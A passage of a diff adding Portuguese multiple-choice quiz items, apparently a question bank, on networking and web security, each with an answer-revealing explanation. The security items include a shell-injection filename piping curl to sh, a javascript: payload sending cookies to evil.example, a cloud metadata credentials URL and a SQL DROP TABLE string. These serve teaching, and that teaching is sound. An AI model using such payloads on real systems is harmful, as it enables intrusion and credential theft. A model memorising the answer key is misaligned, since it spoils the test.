+    "question": "O HTTP/2 já multiplexa várias requisições em uma conexão. Por que o HTTP/3 ainda tem desempenho melhor em redes móveis com perda de pacotes?",
+    "options": [
+      "O HTTP/2 não comprime cabeçalhos, então suas requisições ficam bem maiores",
+      "O HTTP/2 abre uma conexão TCP por requisição, multiplicando os handshakes",
+      "Um segmento TCP perdido trava todos os streams HTTP/2; o QUIC os isola",
+      "O HTTP/3 dispensa a criptografia TLS, o que tira um round trip por requisição"
+    ],
+    "explanation": "O HTTP/2 eliminou o head-of-line blocking na camada de aplicação, mas todos os streams compartilham um único fluxo de bytes TCP, então uma única perda atrasa todos os streams até a retransmissão. O QUIC roda sobre UDP e trata perdas por stream. O HTTP/2 tem compressão de cabeçalhos HPACK e usa uma única conexão, e o HTTP/3 sempre usa TLS 1.3, integrado ao QUIC."
+  },
+  {
+    "id": "nw-tls-missing-intermediate",
+    "title": "Navegadores funcionam, o curl não",
+    "question": "Depois de instalar um novo certificado, os navegadores carregam o site normalmente, mas o curl e um cliente Java falham com 'unable to get local issuer certificate'. Qual é a causa mais provável?",
+    "options": [
+      "O servidor não envia o certificado da CA raiz, que todo cliente exige",
+      "Os clientes não enviam SNI, então o servidor devolve o certificado padrão",
+      "O certificado expirou, mas os navegadores dão um período de tolerância",
+      "O servidor envia só o certificado folha, sem o intermediário"
+    ],
+    "explanation": "Os clientes precisam de uma cadeia do certificado folha até uma raiz confiável, e o servidor deve enviar o folha mais os intermediários. Os navegadores muitas vezes escondem o erro de configuração usando intermediários em cache ou buscando-os pela extensão AIA, enquanto a maioria das bibliotecas não faz isso. As raízes já estão no trust store do cliente e não precisam ser enviadas; problemas de SNI ou expiração geram erros diferentes."
+  },
+  {
+    "id": "nw-tls13-handshake-rtt",
+    "title": "Round trips do handshake TLS 1.3",
+    "question": "Em um handshake TLS 1.3 completo (sem resumption, sem 0-RTT) sobre uma conexão TCP já estabelecida, quantos round trips passam antes de o cliente poder enviar dados da aplicação?",
+    "options": [
+      "2",
+      "1",
+      "0",
+      "3"
+    ],
+    "explanation": "No TLS 1.3, o cliente envia seu key share no ClientHello, o servidor responde com o próprio key share, o certificado e o Finished em um único voo, e o cliente pode enviar seu Finished junto com os dados da aplicação. O TLS 1.2 precisava de 2 round trips; 0 round trips só é possível com resumption e early data."
+  },
+  {
+    "id": "nw-tls13-zero-rtt-replay",
+    "title": "Por que dados 0-RTT precisam ser idempotentes",
+    "question": "Por que os servidores normalmente só aceitam early data 0-RTT do TLS 1.3 para requisições idempotentes, como GET?",
+    "options": [
+      "Um atacante pode reenviar o early data e repetir a ação",
+      "O early data é enviado sem criptografia, então só requisições públicas podem usá-lo",
+      "O early data é enviado antes do SNI, o que quebra o roteamento de requisições com corpo",
+      "A especificação do TLS limita o early data ao método HTTP GET"
+    ],
+    "explanation": "Dados 0-RTT são criptografados com chaves derivadas do PSK de uma sessão anterior, mas o servidor não consegue saber se esse primeiro voo está sendo reenviado, então um POST que cobra um cartão poderia rodar duas vezes. Eles são criptografados, e o SNI vai no mesmo ClientHello. O TLS não sabe nada sobre métodos HTTP; a restrição é uma política da aplicação."
+  },
+  {
+    "id": "nw-tls-421-coalescing",
+    "title": "Coalescing de conexão atinge o vhost errado",
+    "question": "a.example e b.example compartilham um IP e um certificado cujo SAN cobre os dois, mas estão configurados como vhosts TLS separados. Os navegadores reutilizam a conexão HTTP/2 aberta para a.example para pedir b.example, e o servidor trata isso errado. Qual resposta faz o cliente tentar de novo em uma conexão nova?",
+    "options": [
+      "400 Bad Request",
+      "503 Service Unavailable",
+      "421 Misdirected Request",
+      "426 Upgrade Required"
+    ],
+    "explanation": "O HTTP/2 permite que o cliente agrupe (coalesce) requisições para outra origem em uma conexão existente quando o certificado a cobre e o IP coincide. Se o servidor não consegue atender essa origem naquela conexão, o 421 diz ao cliente para tentar de novo em uma nova conexão, onde o SNI vai selecionar o vhost certo. 400 e 503 não são repetidos dessa forma, e 426 pede um upgrade de protocolo."
+  },
+  {
+    "id": "nw-proxy-client-ip",
+    "title": "Toda requisição vem do IP do proxy",
+    "question": "Sua aplicação atrás de um reverse proxy registra o endereço do proxy como IP do cliente e aplica rate limiting a todos os usuários como se fossem um só. Qual é a correção certa?",
+    "options": [
+      "Ler o IP de X-Forwarded-For ou Forwarded, confiando só nas entradas do seu proxy",
+      "Usar sempre o valor mais à esquerda do X-Forwarded-For, venha de onde vier a requisição",
+      "Mudar o load balancer para camada 4 para a aplicação ver o TCP do proxy diretamente",
+      "Aplicar rate limiting por User-Agent, já que ele passa pelos proxies sem alteração"
+    ],
+    "explanation": "O proxy abre a própria conexão TCP, então a aplicação precisa usar o cabeçalho que o proxy adiciona. Clientes podem enviar valores forjados de X-Forwarded-For, então use a entrada acrescentada pelo seu proxy confiável (contando pela direita), não a mais à esquerda. Um balanceador de camada 4 não muda isso sem PROXY protocol ou modo transparente, e o User-Agent é facilmente compartilhado ou falsificado."
+  },
+  {
+    "id": "nw-lb-idle-timeout-502",
+    "title": "502 intermitentes atrás de um load balancer",
+    "question": "Um Application Load Balancer tem idle timeout de 60 segundos e reutiliza conexões keep-alive com os backends. Os backends fecham conexões keep-alive ociosas após 5 segundos. Com tráfego baixo, aparecem 502 esporádicos. Por quê?",
+    "options": [
+      "Os health checks do LB são frequentes demais e marcam alvos saudáveis como fora",
+      "O LB reutiliza uma conexão que o backend acabou de fechar; aumente o timeout dele",
+      "O keep-alive do HTTP/1.1 é incompatível com load balancers e deveria ser desativado",
+      "O buffer de recepção TCP do backend estoura quando as conexões ficam ociosas demais"
+    ],
+    "explanation": "Quando o backend fecha uma conexão do pool que o LB ainda considera utilizável, a próxima requisição enviada por ela falha e o LB retorna 502. A documentação da AWS recomenda que o idle timeout da aplicação seja maior que o do load balancer. Health checks causam a remoção de alvos, não 502 intermitentes, e keep-alive com os backends é normal."
+  },
+  {
+    "id": "nw-nat-inbound-unsolicited",
+    "title": "Alcançando um host atrás de NAT",
+    "question": "Por que um host externo não consegue abrir uma conexão com um notebook atrás de um roteador NAT doméstico, a menos que haja port forwarding configurado?",
+    "options": [
+      "Os provedores descartam todo pacote de entrada destinado a IPs residenciais",
+      "O TCP não permite que um host atrás de NAT atue como servidor",
+      "O roteador NAT criptografa os endereços internos, então o pacote não pode ser decifrado",
+      "O NAT não tem mapeamento para tráfego de entrada não solicitado, então o descarta"
+    ],
+    "explanation": "Um roteador NAT compartilha um endereço público entre vários hosts privados e cria entradas de tradução quando hosts internos enviam tráfego para fora. Um pacote de entrada não solicitado não casa com nenhuma entrada, então é descartado. O port forwarding adiciona um mapeamento estático. O TCP não tem essa restrição, provedores em geral não bloqueiam toda entrada, e o NAT não criptografa nada."
+  },
+  {
+    "id": "nw-firewall-stateless-nacl",
+    "title": "ACL stateless quebra as respostas",
+    "question": "A network ACL de uma sub-rede permite entrada TCP 443 de qualquer lugar e saída TCP 443 para qualquer lugar. Clientes se conectam a um servidor web na sub-rede, mas as conexões nunca se completam. Por quê?",
+    "options": [
+      "Network ACLs só avaliam tráfego entre sub-redes, nunca com a internet",
+      "O HTTPS também precisa de UDP 443 liberado para concluir o handshake TLS",
+      "A ACL é stateless, então as respostas para a porta efêmera são bloqueadas",
+      "As regras de saída são avaliadas antes das de entrada, então o SYN é descartado"
+    ],
+    "explanation": "Um firewall stateful ou um security group permite automaticamente o tráfego de retorno de conexões permitidas. Uma network ACL stateless avalia cada pacote de forma independente, então as respostas do servidor, que vão da porta 443 para a porta efêmera do cliente, precisam de uma regra de saída cobrindo o range efêmero, como 1024-65535. TLS sobre TCP não precisa de UDP."
+  },
+  {
+    "id": "nw-websocket-upgrade",
+    "title": "Como uma conexão WebSocket começa",
+    "question": "Como uma conexão WebSocket é estabelecida?",
+    "options": [
+      "Um GET HTTP/1.1 com Upgrade: websocket e uma resposta 101",
+      "Um handshake UDP dedicado em uma porta separada, negociada antes",
+      "Um POST HTTP respondido com 200 OK, e depois os frames são enviados",
+      "Uma extensão TLS negociada no ClientHello que troca o protocolo"
+    ],
+    "explanation": "O handshake de abertura é uma requisição HTTP com os cabeçalhos Upgrade e Connection mais Sec-WebSocket-Key; o servidor prova que entendeu devolvendo 101 e Sec-WebSocket-Accept. A mesma conexão TCP passa então a carregar frames WebSocket. No HTTP/2 usa-se um CONNECT estendido, mas continua sendo HTTP, e não UDP ou negociação no nível do TLS."
+  },
+  {
+    "id": "nw-cdn-hashed-assets",
+    "title": "Usuários ainda recebem o JavaScript antigo",
+    "question": "Depois de cada deploy, os usuários continuam recebendo o app.js antigo da sua CDN por horas. Qual é a correção padrão?",
+    "options": [
+      "Colocar max-age=0 em todo asset estático para a CDN sempre buscar na origem",
+      "Fazer purge da CDN inteira a cada deploy, mantendo os mesmos nomes de arquivo",
+      "Nomes de arquivo com hash do conteúdo e cache immutable, e HTML com cache curto",
+      "Acrescentar uma query string aleatória a cada requisição de asset no navegador"
+    ],
+    "explanation": "Quando o nome do arquivo muda junto com o conteúdo, um novo deploy gera novas URLs, então arquivos antigos em cache nunca precisam ser invalidados e podem ficar em cache por um ano. Só o pequeno documento HTML precisa de cache curto ou revalidado. max-age=0 e query strings aleatórias anulam o cache, e o purge da CDN não limpa o cache dos navegadores."
+  },
+  {
+    "id": "nw-websocket-rebalancing",
+    "title": "Carga de WebSocket desbalanceada após scale-out",
+    "question": "Você escala um serviço WebSocket de 4 para 8 instâncias atrás de um load balancer, mas as 4 instâncias originais continuam com a maior parte da carga por horas. Por quê?",
+    "options": [
+      "Load balancers não roteiam WebSocket para instâncias adicionadas após a inicialização",
+      "O balanceamento é feito por conexão, e conexões longas ficam onde estão",
+      "Os frames WebSocket são roteados por mensagem, mas o balanceador guarda a rota por IP",
+      "As novas instâncias precisam antes fazer um handshake WebSocket com cada instância antiga"
+    ],
+    "explanation": "Um load balancer escolhe o alvo a cada nova conexão TCP. Conexões WebSocket podem durar horas, então os clientes existentes ficam nas instâncias antigas e só as novas conexões chegam às novas instâncias. Correções comuns são roteamento por menos conexões (least connections) e fazer os servidores fecharem de forma graciosa uma fração das conexões para os clientes reconectarem e rebalancearem."
+  },
+  {
+    "id": "sec-pwd-argon2id",
+    "title": "Armazenando senhas de usuários",
+    "question": "Qual abordagem é a mais adequada para armazenar senhas de usuários em um sistema novo em 2026?",
+    "options": [
+      "SHA-256 com um único salt para toda a aplicação",
+      "Criptografia AES-256 com a chave guardada na configuração",
+      "MD5 aplicado iterativamente mil vezes",
+      "Argon2id com um salt aleatório único por senha"
+    ],
+    "explanation": "A OWASP recomenda o Argon2id, uma função de hash de senha memory-hard com salt por senha, de modo que cada hash precise ser atacado separadamente e o cracking em GPU fique caro. Um único SHA-256 rápido com salt compartilhado é barato de atacar por força bruta, criptografia é reversível por qualquer um que obtenha a chave, e 1.000 rodadas de MD5 ainda são rápidas demais."
+  },
+  {
+    "id": "sec-pwd-fast-hash",
+    "title": "Por que hashes rápidos são ruins para senhas",
+    "question": "Por que um hash SHA-256 com salt ainda é uma escolha ruim para armazenar senhas?",
+    "options": [
+      "Ele é rápido, então GPUs testam bilhões de palpites por segundo",
+      "O SHA-256 tem ataques de colisão práticos que permitem forjar um hash igual",
+      "O SHA-256 não pode ser combinado com salt sem enfraquecer sua segurança",
+      "A saída do SHA-256 é longa demais para colunas comuns de banco de dados"
+    ],
+    "explanation": "Hashes de uso geral são projetados para velocidade, que é exatamente o que um atacante offline quer. Funções de hash de senha como Argon2id, scrypt, bcrypt ou PBKDF2 adicionam um fator de trabalho ajustável para tornar cada palpite mais lento. O SHA-256 não tem colisões práticas, salts funcionam bem com ele e sua saída de 32 bytes é pequena."
+  },
+  {
+    "id": "sec-pwd-bcrypt-72-bytes",
+    "title": "Passphrases longas e bcrypt",
+    "question": "Usuários de um sistema baseado em bcrypt percebem que mudar caracteres depois do 72º byte de uma passphrase longa não afeta o login. Por quê?",
+    "options": [
+      "O bcrypt normaliza Unicode e descarta caracteres fora do ASCII",
+      "O fator de custo está baixo demais, então o bcrypt pula o final da entrada",
+      "O bcrypt só processa os primeiros 72 bytes da entrada e ignora o resto",
+      "O salt de 16 bytes sobrescreve internamente a parte final da senha"
+    ],
+    "explanation": "O bcrypt tem limite de entrada de 72 bytes; muitas implementações truncam silenciosamente entradas maiores. A OWASP aponta esse limite e recomenda o Argon2id para sistemas novos; fazer pré-hash para contornar isso é arriscado e precisa ser feito com cuidado. O custo só altera as iterações, e o salt é um parâmetro separado."
+  },
+  {
+    "id": "sec-pwd-upgrade-legacy-md5",
+    "title": "Migrando de MD5 sem salt",
+    "question": "Você herdou 2 milhões de hashes de senha MD5 sem salt e quer proteção com Argon2id sem forçar um reset em massa. Qual é a abordagem recomendada?",
+    "options": [
+      "Migrar cada usuário para Argon2id no próximo login e deixar as outras contas em MD5 até lá",
+      "Quebrar os hashes MD5 offline para recuperar as senhas e depois aplicar Argon2id",
+      "Adicionar agora uma coluna de salt e guardá-lo ao lado de cada hash MD5 existente",
+      "Envolver já todo hash como Argon2id(md5_hash) e refazer o hash limpo no próximo login"
+    ],
+    "explanation": "Aplicar Argon2id sobre os hashes existentes protege todas as contas imediatamente, inclusive as inativas, que de outra forma ficariam anos em MD5 puro. No login, você verifica pelo esquema em camadas e o substitui por um hash Argon2id limpo da senha. Quebrar as senhas dos usuários é antiético e incompleto, e adicionar um salt a um hash já calculado não acrescenta nada."
+  },
+  {
+    "id": "sec-mfa-phishing-resistant",
+    "title": "MFA que resiste a proxies de phishing",
+    "question": "Atacantes usam um kit de phishing com reverse proxy que retransmite a página de login real em tempo real. Qual método de MFA impede isso?",
+    "options": [
+      "Códigos temporários (TOTP) de um app autenticador",
+      "Passkeys WebAuthn / FIDO2, com assinaturas vinculadas à origem do site",
+      "Códigos de uso único enviados por SMS",
+      "Notificações push com um botão de aprovar"
+    ],
+    "explanation": "Com WebAuthn, o navegador inclui a origem no que o autenticador assina, então uma credencial de bank.example nunca produz uma asserção válida no domínio de phishing. Códigos TOTP e SMS são digitados pelo usuário e podem ser retransmitidos na hora, e aprovações push podem ser retransmitidas ou exploradas por fadiga de notificações."
+  },
+  {
+    "id": "sec-authz-idor",
+    "title": "Trocando o ID na URL",
+    "question": "Um usuário logado troca /api/invoices/1001 por /api/invoices/1002 e recebe a fatura de outro cliente. Que vulnerabilidade é essa?",
+    "options": [
+      "Cross-site request forgery contra a API de faturas",
+      "SQL injection pelo parâmetro de ID da fatura",
+      "Session fixation na sessão do usuário autenticado",
+      "Autorização em nível de objeto quebrada (IDOR)"
+    ],
+    "explanation": "O servidor autentica o usuário, mas nunca verifica se o objeto pedido pertence a ele. A correção é uma checagem de propriedade ou permissão em todo acesso a objeto, e não esconder ou ofuscar IDs. Não há requisição forjada entre sites, SQL injetado nem sessão fixada envolvidos."
+  },
+  {
+    "id": "sec-authz-mass-assignment",
+    "title": "Virando admin com uma atualização de perfil",
+    "question": "`PATCH /api/users/me` faz o binding do corpo JSON direto na entidade User e a salva. Um atacante envia `{\"displayName\":\"x\",\"role\":\"admin\"}` e vira admin. Qual é a correção certa?",
+    "options": [
+      "Fazer binding para um DTO com allow-list dos campos editáveis",
+      "Garantir na UI que o campo role fique oculto para quem não é admin",
+      "Validar que o valor de role é um dos nomes de papel conhecidos",
+      "Exigir HTTPS para atacantes não adicionarem campos ao corpo"
+    ],
+    "explanation": "Isso é mass assignment: o framework preenche qualquer propriedade citada na requisição. Fazer binding para um modelo de entrada dedicado, contendo só os campos que o usuário pode alterar (ou uma allow-list explícita), impede que campos de privilégio sejam definidos. Esconder na UI é contornado com qualquer cliente HTTP, validar nomes de papel ainda deixa 'admin' passar, e o TLS não impede quem está enviando."
+  },
+  {
+    "id": "sec-oidc-id-token",
+    "title": "O que o OpenID Connect acrescenta ao OAuth",
+    "question": "O que o OpenID Connect acrescenta ao OAuth 2.0?",
+    "options": [
+      "Criptografia obrigatória dos access tokens enviados aos resource servers",
+      "Um ID token que descreve o usuário autenticado, tornando o OAuth útil para login",
+      "Refresh tokens, que o OAuth 2.0 puro não define",
+      "Um password grant que substitui os authorization codes"
+    ],
+    "explanation": "O OAuth 2.0 é um framework de autorização para acesso delegado a APIs; ele não diz ao cliente quem é o usuário. O OIDC adiciona uma camada de identidade: um ID token (um JWT assinado com iss, sub, aud, exp, nonce), além de um endpoint UserInfo e discovery. Refresh tokens já existem no OAuth 2.0, e o password grant é desencorajado."
+  },
+  {
+    "id": "sec-oauth-pkce",
+    "title": "O que o PKCE protege",
+    "question": "Um app mobile usa o fluxo authorization code do OAuth com PKCE. Qual ataque o PKCE impede especificamente?",
+    "options": [
+      "Roubo de access tokens do storage do navegador via XSS",
+      "Cross-site request forgery contra a API do resource server",
+      "Um atacante resgatar um authorization code roubado",
+      "Replay de um access token válido em outra API"
+    ],
+    "explanation": "O cliente envia um hash de um code_verifier aleatório na requisição de autorização e o próprio verifier ao resgatar o code. Um atacante que intercepta o code (por exemplo, por um app malicioso registrado para o mesmo esquema de redirect) não consegue produzir o verifier. O PKCE não faz nada quanto a tokens já emitidos; hoje ele é recomendado para todos os clientes, inclusive os confidenciais."
+  },
+  {
+    "id": "sec-jwt-audience",
+    "title": "Token de uma API aceito por outra",
+    "question": "Seu identity provider emite access tokens JWT para várias APIs. Um token emitido para a Reports API, de baixo privilégio, é aceito pela Payments API. Qual validação falta na Payments API?",
+    "options": [
+      "A checagem da claim de expiração (exp)",
+      "A checagem da claim not-before (nbf)",
+      "A checagem da claim de audience (aud)",
+      "A checagem de unicidade do JWT ID (jti)"
+    ],
+    "explanation": "As duas APIs confiam no mesmo issuer e na mesma chave de assinatura, então a assinatura é válida; só a claim aud diz a qual destinatário o token se destina. Cada API precisa rejeitar tokens cujo audience não seja ela mesma. exp e nbf validam janelas de tempo e jti ajuda a detectar replay, e nenhum deles distingue APIs."
+  },
+  {
+    "id": "sec-jwt-alg-confusion",
+    "title": "Forjando um token RS256 com a chave pública",
+    "question": "Uma API espera tokens RS256 e chama `verify(token, publicKeyPem)` de uma biblioteca que escolhe o algoritmo pelo cabeçalho do token. Um atacante forja um token de admin usando apenas a chave pública publicada. O que ele provavelmente fez?",
+    "options": [
+      "Pôs alg como HS256 e assinou com os bytes da chave pública como segredo HMAC",
+      "Fatorou o módulo RSA da chave pública para recuperar a chave privada",
+      "Reassinou o token com RS512 usando a chave pública como chave de assinatura",
+      "Removeu o segmento da assinatura e manteve alg como RS256"
+    ],
+    "explanation": "Na confusão de algoritmo, o verificador trata a chave pública, conhecida por todos, como segredo HMAC porque o cabeçalho diz HS256, então o HMAC do atacante é validado. A correção é fixar no servidor o algoritmo e o tipo de chave aceitos, em vez de confiar no cabeçalho. Chaves RSA de tamanho normal não podem ser fatoradas, e uma assinatura ausente falha na verificação RS256."
+  },
+  {
+    "id": "sec-oauth-refresh-rotation-reuse",
+    "title": "Detectando um refresh token roubado",
+    "question": "Um authorization server rotaciona os refresh tokens a cada uso. Ele recebe um refresh token que já tinha sido trocado antes. O que ele deve fazer?",
+    "options": [
+      "Emitir novos tokens, pois o token ainda está no período de validade",
+      "Tratar como provável roubo e revogar toda a família de tokens daquele grant",
+      "Rejeitar só esta requisição e manter válido o token emitido mais recentemente",
+      "Pedir ao cliente que reautentique o usuário com PKCE antes de emitir tokens"
+    ],
+    "explanation": "Com rotação, cada refresh token é de uso único. Ver um token usado de novo significa que duas partes o têm (o cliente legítimo e um atacante), e o servidor não consegue saber quem é quem, então o OAuth security BCP recomenda invalidar o refresh token ativo daquele grant. Rejeitar só esta requisição deixa o token do atacante funcionando se ele tiver feito o refresh primeiro."
+  },
+  {
+    "id": "sec-sqli-parameterized",
+    "title": "Principal defesa contra SQL injection",
+    "question": "Qual é a principal defesa contra SQL injection quando a entrada do usuário é usada na cláusula WHERE de uma query?",
+    "options": [
+      "Escapar aspas simples na entrada com uma expressão regular",
+      "Esconder mensagens de erro do banco dos usuários finais",
+      "Colocar um web application firewall na frente da aplicação",
+      "Queries parametrizadas, que tratam a entrada como dado"
+    ],
+    "explanation": "Queries parametrizadas enviam a estrutura SQL e os valores separadamente, então a entrada nunca consegue mudar o significado da query. Escapes feitos à mão deixam passar casos de borda (encodings, contextos numéricos), esconder erros só torna a exploração cega em vez de impossível, e um WAF é uma camada extra contornável, não a correção."
+  },
+  {
+    "id": "sec-cmd-injection-shell",
+    "title": "Chamando o shell com um nome de arquivo do usuário",
+    "question": "Um serviço Python roda `subprocess.run(f\"convert {filename} out.png\", shell=True)` com um filename fornecido pelo usuário. Qual é a melhor correção?",
+    "options": [
+      "Passar uma lista de argumentos com shell=False e validar o filename",
+      "Envolver o filename em aspas duplas dentro da f-string antes de rodar",
+      "Remover ponto e vírgula e & do filename antes de rodar o comando",
+      "Rodar o comando dentro de um container para o shell não alcançar o host"
+    ],
+    "explanation": "Com shell=True a string é interpretada por /bin/sh, então uma entrada como 'a.jpg; curl evil|sh' executa comandos extras. Uma lista de argumentos dispensa totalmente o shell; você ainda deve validar a entrada e usar '--' para que um nome como '-delete' não seja tratado como opção. Aspas e blocklists são facilmente contornadas com $(), crases ou quebras de linha, e containers só reduzem o impacto."
+  },
+  {
+    "id": "sec-path-traversal-join",
+    "title": "Path traversal via os.path.join",
+    "question": "Um endpoint de download faz `open(os.path.join(BASE_DIR, user_path))`, e você já rejeita qualquer user_path que contenha '..'. Um atacante pede user_path=/etc/passwd. O que acontece?",
+    "options": [
+      "os.path.join prefixa BASE_DIR, gerando BASE_DIR/etc/passwd, o que é seguro",
+      "O Python lança ValueError porque um caminho absoluto não pode ser unido",
+      "os.path.join descarta BASE_DIR diante de um caminho absoluto e abre /etc/passwd",
+      "open() recusa caminhos absolutos, a menos que o arquivo seja aberto em modo binário"
+    ],
+    "explanation": "Quando um componente posterior do os.path.join é absoluto, todos os anteriores são descartados. Por isso, bloquear '..' não basta. A defesa robusta é evitar caminhos controlados pelo usuário (use IDs) ou resolver o caminho canônico e verificar que ele continua dentro do diretório base."
+  },
+  {
+    "id": "sec-xss-output-encoding",
+    "title": "Correção principal para XSS armazenado",
+    "question": "Usuários podem postar comentários que são exibidos a outros usuários, e um atacante armazenou `<script>` em um deles. Qual é a correção principal?",
+    "options": [
+      "Remover a string <script> dos comentários antes de salvá-los",
+      "Servir o site via HTTPS com HSTS habilitado",
+      "Guardar os comentários em base64 no banco de dados",
+      "Encoding de saída por contexto, como o auto-escaping do template"
+    ],
+    "explanation": "XSS acontece quando o navegador interpreta dados como markup ou código. Fazer encoding na saída para o contexto específico (corpo HTML, atributo, JavaScript, URL) os transforma de volta em texto. Filtragem por blocklist é contornada com event handlers como onerror, HTTPS não afeta o conteúdo, e guardar em base64 não muda nada depois que o valor é decodificado e renderizado."
+  },
+  {
+    "id": "sec-xss-javascript-url",
+    "title": "XSS apesar do auto-escaping de HTML",
+    "question": "Um template engine faz escape de HTML em todas as variáveis. Uma página de perfil renderiza `<a href=\"{{ website }}\">My site</a>`. Qual valor de website ainda leva à execução de script?",
+    "options": [
+      "<script>alert(document.cookie)</script>",
+      "javascript:fetch('//evil.example?c='+document.cookie)",
+      "\"><img src=x onerror=alert(1)>",
+      "'; DROP TABLE users; --"
+    ],
+    "explanation": "O escape de HTML neutraliza sinais de menor/maior e aspas, então os payloads de tag e de quebra de atributo são renderizados de forma inofensiva, mas uma URL javascript: não tem nada a escapar e roda quando clicada. URLs em href ou src precisam de validação de esquema contra uma allow-list, como http e https. O último valor é um payload SQL irrelevante para a renderização HTML."
+  },
+  {
+    "id": "sec-csrf-samesite-lax",
+    "title": "Quando cookies SameSite=Lax ainda são enviados",
+    "question": "Seu cookie de sessão tem SameSite=Lax. Uma página em evil.example dispara cada uma das requisições abaixo para o seu site. Qual delas ainda inclui o cookie de sessão?",
+    "options": [
+      "Um formulário POST enviado automaticamente de um iframe oculto",
+      "Uma navegação GET de nível superior quando o usuário clica em um link",
+      "Uma chamada fetch() feita com credentials: 'include'",
+      "Uma tag <img> cujo src aponta para o seu site"
+    ],
+    "explanation": "Cookies Lax não são enviados em sub-requisições cross-site (imagens, iframes, fetch) nem em POSTs cross-site, mas são enviados em navegações de nível superior com métodos seguros como GET. Por isso ações que alteram estado nunca devem ser acessíveis via GET, e por isso o SameSite complementa, e não substitui, os tokens CSRF."
+  },
+  {
+    "id": "sec-xss-dom-fragment",
+    "title": "O XSS que o WAF nunca vê",
+    "question": "Uma página roda `document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1))`. Os ataques funcionam, mas nem o WAF nem os logs do servidor mostram payload algum. Por quê, e qual é a correção?",
+    "options": [
+      "O WAF só decodifica URL encoding uma vez; ative a decodificação recursiva nas regras",
+      "O servidor remove o payload antes de registrar; registre os corpos brutos das requisições",
+      "Navegadores só enviam fragmentos via HTTP/2; force HTTP/1.1 para o WAF inspecioná-los",
+      "O fragmento nunca chega ao servidor; use textContent em vez de innerHTML"
+    ],
+    "explanation": "Tudo o que vem depois de # fica no navegador, então esse XSS baseado em DOM escapa de qualquer inspeção no servidor. O sink é o innerHTML; escrever com textContent trata o valor como texto, e Trusted Types pode garantir que sinks perigosos só recebam valores sanitizados. Nenhuma versão do HTTP envia fragmentos."
+  },
+  {
+    "id": "sec-csrf-naive-double-submit",
+    "title": "Fraqueza do double-submit cookie ingênuo",
+    "question": "Uma aplicação se defende de CSRF verificando se um valor de cabeçalho é igual ao valor aleatório de um cookie csrf (double submit ingênuo). O atacante controla um subdomínio irmão. Como ele pode contornar isso?",
+    "options": [
+      "Definir seu próprio cookie csrf para o domínio pai e enviar o valor igual na requisição",
+      "Ler o cookie csrf da vítima a partir do subdomínio irmão via preflight CORS",
+      "Repetir o cabeçalho capturado de uma requisição anterior, já que o valor não expira",
+      "Remover o cabeçalho Origin para o servidor pular a comparação"
+    ],
+    "explanation": "O servidor só verifica se os dois valores coincidem, não se foi ele que os emitiu. Um subdomínio irmão (ou um atacante na rede, em HTTP puro) pode plantar um cookie para o domínio pai compartilhado e fazer os dois lados coincidirem. A OWASP recomenda a variante assinada do double submit, em que o token é um HMAC vinculado à sessão do usuário."
+  },
+  {
+    "id": "sec-ssrf-metadata",
+    "title": "Baixador de imagens atinge o endpoint de metadata",
+    "question": "Um recurso em uma instância EC2 baixa uma imagem de qualquer URL fornecida pelo usuário. Um atacante envia `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Qual é o risco?",
+    "options": [
+      "XSS refletido quando a prévia da imagem renderiza a resposta de metadata",
+      "DNS rebinding do próprio hostname da aplicação para o atacante",
+      "SSRF que expõe as credenciais temporárias de nuvem da role da instância",
+      "Negação de serviço, porque endereços link-local não são roteáveis"
+    ],
+    "explanation": "O servidor faz a requisição de dentro da rede da nuvem, onde o serviço de metadata link-local entrega credenciais da role IAM. Devolver ou vazar essa resposta dá ao atacante esses privilégios. As defesas incluem allow-list de destinos, bloqueio de ranges internos e link-local e exigência do IMDSv2."
+  },
+  {
+    "id": "sec-ssrf-dns-rebinding",
+    "title": "Bypass da validação contra SSRF",
+    "question": "Para evitar SSRF, seu código resolve o hostname da URL, rejeita IPs privados e link-local e então chama um cliente HTTP com a URL original. Atacantes ainda alcançam 169.254.169.254. Qual bypass explica isso?",
+    "options": [
+      "O nome resolve para um IP público na validação e para o IP interno na hora do fetch",
+      "O cliente HTTP ignora o hostname e sempre se conecta ao endereço de metadata",
+      "A especificação IP exclui endereços link-local das checagens de range privado",
+      "Tokens IMDSv2 deixam qualquer requisição alcançar o metadata depois de emitidos"
+    ],
+    "explanation": "A checagem e a conexão resolvem o DNS separadamente, então um nome controlado pelo atacante com TTL mínimo pode responder diferente a cada vez (DNS rebinding); seguir redirects para endereços internos tem o mesmo efeito. Corrija conectando-se exatamente ao IP validado, revalidando cada redirect e exigindo o IMDSv2, cujo token obtido via PUT bloqueia a maioria dos SSRF simples."
+  },
+  {
+    "id": "sec-cors-reflect-origin",
+    "title": "Refletindo o Origin com credenciais",
+    "question": "Para resolver um erro de CORS, um desenvolvedor faz a API ecoar o cabeçalho Origin da requisição em Access-Control-Allow-Origin e também envia `Access-Control-Allow-Credentials: true`. Qual é a consequência?",
+    "options": [
+      "Os navegadores bloqueiam a resposta porque um origin refletido conta como curinga",
+      "Só subdomínios same-site leem as respostas, pois os cookies têm escopo de domínio",
+      "Qualquer site pode fazer requisições com credenciais e ler as respostas da vítima",
+      "As requisições de preflight falham, então só GETs simples continuam funcionando"
+    ],
+    "explanation": "Os navegadores proíbem '*' junto com credenciais, mas aceitam um origin concreto ecoado, então evil.example consegue ler os dados da vítima usando os cookies dela. A abordagem correta é uma allow-list explícita de origens confiáveis. Os navegadores não conseguem distinguir um valor refletido de um configurado, e os preflights passam com o origin ecoado."
+  },
+  {
+    "id": "sec-csp-nonce-strict-dynamic",
+    "title": "CSP com nonce versus allow-list de hosts",
+    "question": "Por que a OWASP prefere uma CSP estrita como `script-src 'nonce-{random}' 'strict-dynamic'` a uma lista de hosts de script permitidos como cdn.example.com?",
+    "options": [
+      "Allow-lists de hosts não são suportadas pelos navegadores atuais e são ignoradas",
+      "Hosts permitidos costumam servir JSONP ou bibliotecas antigas que permitem rodar código do atacante",
+      "Nonces dispensam o encoding de saída, então o XSS não pode ocorrer de jeito nenhum",
+      "strict-dynamic bloqueia todo script inline, inclusive os que têm um nonce válido"
+    ],
+    "explanation": "CDNs grandes e hosts de API frequentemente expõem endpoints ou versões de bibliotecas que um atacante pode usar como script gadgets, tornando as allow-lists contornáveis. Um nonce imprevisível por resposta deixa rodar só os scripts que o servidor pretendia, e o strict-dynamic estende a confiança aos scripts que eles carregam. A CSP é defesa em profundidade, não substitui o encoding, e scripts inline com nonce rodam."
+  },
+  {
+    "id": "sec-secrets-runtime-injection",
+    "title": "Onde deve ficar a senha do banco de produção",
+    "question": "Onde deve ser mantida a senha do banco de dados de produção de um serviço em container?",
+    "options": [
